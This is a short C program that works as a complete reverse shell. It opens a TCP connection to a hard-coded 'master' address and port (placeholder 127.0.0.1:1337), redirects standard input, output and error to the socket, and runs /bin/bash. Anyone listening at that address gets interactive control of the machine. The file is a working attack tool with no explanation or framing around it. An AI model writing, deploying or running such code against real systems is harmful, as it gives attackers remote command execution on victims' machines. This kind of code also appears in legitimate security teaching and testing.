#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stddef.h>
#include <unistd.h>

#define MASTER_IP "127.0.0.1"
#define MASTER_PORT 1337

int main(int argc, char *argv[])
{
	int sock_fd = socket(AF_INET, SOCK_STREAM, 0);
	if(sock_fd < 0)
		return 1;

	struct sockaddr_in addr;
	addr.sin_family = AF_INET;
	addr.sin_port = htons(MASTER_PORT);
	addr.sin_addr.s_addr = inet_addr(MASTER_IP);

	if(connect(sock_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		return 1;

	dup2(sock_fd, STDIN_FILENO);
	dup2(sock_fd, STDOUT_FILENO);
	dup2(sock_fd, STDERR_FILENO);

	char * const args[] = { "/bin/bash", NULL };
	execve("/bin/bash", args, NULL);

	return 0; //unreachable code (if all goes well)
}
